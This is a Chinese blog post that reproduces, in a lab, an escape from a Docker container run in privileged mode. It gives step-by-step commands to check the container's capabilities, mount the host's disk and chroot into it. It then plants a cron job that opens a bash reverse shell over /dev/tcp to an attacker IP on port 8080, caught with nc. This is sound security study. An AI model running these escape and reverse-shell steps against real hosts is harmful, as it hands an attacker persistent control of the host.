
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/CVE-Lemon/p/18674800" title="发布于 2025-01-17 09:23">
    <span role="heading" aria-level="2">[docker逃逸] Privileged 特权模式逃逸复现</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>本文作者CVE-柠檬i<br>
CSDN：<a href="https://blog.csdn.net/weixin_49125123" target="_blank" rel="noopener nofollow">https://blog.csdn.net/weixin_49125123</a><br>
博客园：<a href="https://www.cnblogs.com/CVE-Lemon" target="_blank">https://www.cnblogs.com/CVE-Lemon</a><br>
微信公众号：Lemon安全</p>
<h3 id="简述">简述</h3>
<p>在 Docker 中，Privileged 特权模式赋予容器几乎与宿主机相同的权限，允许其访问所有设备和内核功能。这种模式虽然提供了灵活性，但也带来了安全风险，可能导致容器逃逸，即攻击者从容器内获取宿主机权限。</p>
<h3 id="环境配置">环境配置</h3>
<p>以特权模式创建容器</p>
<pre><code class="language-bash">docker pull centos
docker run -itd --privileged centos /bin/bash
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202501/2855436-20250116132150110-809396772.png" alt="" loading="lazy"></p>
<p>查看当前是否为docker环境：</p>
<pre><code class="language-bash">cat /proc/1/cgroup|grep docker
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202501/2855436-20250116132153386-693011214.png" alt="" loading="lazy"></p>
<p>systemd-detect-virt 也可以判断当前是否为容器</p>
<pre><code>systemd-detect-virt
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202501/2855436-20250116132156322-1928790066.png" alt="" loading="lazy"></p>
<p>查看当前是否为特权模式</p>
<pre><code>capsh --print
</code></pre>
<pre><code>cat /proc/self/status | grep CapEff
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202501/2855436-20250116132159039-1467183944.png" alt="" loading="lazy"></p>
<p><code>CapEff</code>为<code>0000001fffffffff</code>，当前容器为特权模式。</p>
<h3 id="复现">复现</h3>
<p>使用<code>lsblk</code>查看磁盘</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202501/2855436-20250116132202095-1221630655.png" alt="" loading="lazy"></p>
<p>挂载宿主机根目录</p>
<pre><code>mkdir test
mount /dev/sds3 test
</code></pre>
<p>挂载成功</p>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202501/2855436-20250116132203968-172972275.png" alt="" loading="lazy"></p>
<p>使用chroot切换根目录，方便进行计划任务反弹shell</p>
<pre><code>chroot test
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202501/2855436-20250116132207822-903508813.png" alt="" loading="lazy"></p>
<p>创建计划任务</p>
<pre><code>crontab -e
</code></pre>
<pre><code>*/1 * * * *  /bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/192.168.171.1/8080 0&gt;&amp;1"
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202501/2855436-20250116132210966-1531963090.png" alt="" loading="lazy"></p>
<p>攻击机监听反弹shell，成功反弹了宿主机的shell</p>
<pre><code>nc -lvvp 8080
</code></pre>
<p><img src="https://img2024.cnblogs.com/blog/2855436/202501/2855436-20250116132213538-1047965560.png" alt="" loading="lazy"></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.36955828847800926" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-01-17 09:24">2025-01-17 09:23</span>&nbsp;
<a href="https://www.cnblogs.com/CVE-Lemon">CVE-柠檬i</a>&nbsp;
阅读(<span id="post_view_count">105</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18674800" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18674800);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18674800', targetLink: 'https://www.cnblogs.com/CVE-Lemon/p/18674800', title: '[docker逃逸] Privileged 特权模式逃逸复现' })">举报</a>
</div>
        